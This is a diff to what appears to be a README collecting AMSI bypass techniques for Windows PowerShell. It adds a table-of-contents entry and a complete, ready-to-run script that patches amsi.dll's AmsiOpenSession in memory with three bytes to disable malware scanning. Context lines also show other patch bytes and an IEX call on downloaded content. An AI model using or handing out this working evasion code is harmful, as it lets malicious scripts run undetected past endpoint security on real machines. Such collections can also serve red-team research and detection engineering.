@@ -12,20 +12,21 @@ Most of the scripts are detected by AMSI itself. So you have to find the [trigge
 1. [Patch the provider’s DLL of Microsoft MpOav.dll](#Patch-the-providers-DLL-of-Microsoft-MpOav.dll "Goto Patch-the-providers-DLL-of-Microsoft-MpOav.dll")
 2. [Scanning Interception and Provider function patching](#Scanning-Interception "Goto Scanning-Interception")  
 3. [Patching amsi.dll AmsiScanBuffer by rasta-mouse](#Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
-4. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
-5. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
-6. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
-7. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
-8. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
-9. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
-10. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
-11. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
-12. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
-13. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
-14. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
-15. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
-16. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
-17. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
+4. [Patching amsi.dll AmsiOpenSession](#Patching-amsi.dll-AmsiOpenSession)
+5. [Dont use net webclient](#Dont-use-net-webclient "Goto Dont-use-net-webclient") - this one is not working anymore
+6. [Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass](#Amsi-ScanBuffer-Patch "Goto Amsi-ScanBuffer-Patch")
+7. [Forcing an error](#Forcing-an-error "Goto Forcing-an-error")
+8. [Disable Script Logging](#Disable-Script-Logging "Goto Disable-Script-Logging")
+9. [Amsi Buffer Patch - In memory](#Amsi-Buffer-Patch---In-memory "Goto Amsi-Buffer-Patch---In-memory")
+10. [Same as 6 but integer Bytes instead of Base64](#Same-as-6-but-integer-Bytes-instead-of-Base64 "Goto Same-as-6-but-integer-Bytes-instead-of-Base64")
+11. [Using Matt Graeber's Reflection method](#Using-Matt-Graebers-Reflection-method "Goto Using-Matt-Graebers-Reflection-method")
+12. [Using Matt Graeber's Reflection method with WMF5 autologging bypass](#Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass "Goto Using-Matt-Graebers-Reflection-method-with-WMF5-autologging-bypass")
+13. [Using Matt Graeber's second Reflection method](#Using-Matt-Graebers-second-Reflection-method "Goto Using-Matt-Graebers-second-Reflection-method")
+14. [Using Cornelis de Plaa's DLL hijack method](#Using-Cornelis-de-Plaas-DLL-hijack-method "Goto Using-Cornelis-de-Plaas-DLL-hijack-method")
+15. [Use Powershell Version 2 - No AMSI Support there](#Using-PowerShell-version-2 "Goto Using-PowerShell-version-2")
+16. [Nishang all in one](#Nishang-all-in-one "Goto Nishang-all-in-one")
+17. [Adam Chesters Patch](#Adam-Chester-Patch "Goto Adam-Chester-Patch")
+18. [Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation](#Modified-Amsi-ScanBuffer-Patch "Goto Modified-Amsi-ScanBuffer-Patch")
 
 # Using CLR hooking
 - Source: [https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)
@@ -376,6 +377,50 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
     $content=$reader.ReadToEnd()
 
     IEX($content)
+
+
+# Patching amsi.dll AmsiOpenSession
+```
+# Author: Matheus Alexandre, https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
+function lookFuncAddr{
+Param($moduleName, $functionName)
+
+$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+$tmp=@()
+$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
+return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType{
+Param(
+[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+[Parameter(Position = 1)] [Type] $delType = [Void]
+)
+
+$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
+'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+return $type.CreateType()
+}
+
+[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
+$oldProtect = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
+(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+
+$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)
+
+$3b = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
+
+$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
+```
+
 
 # The Short version of dont use powershell net webclient - Not Working anymore, there was a patch for it
 ```
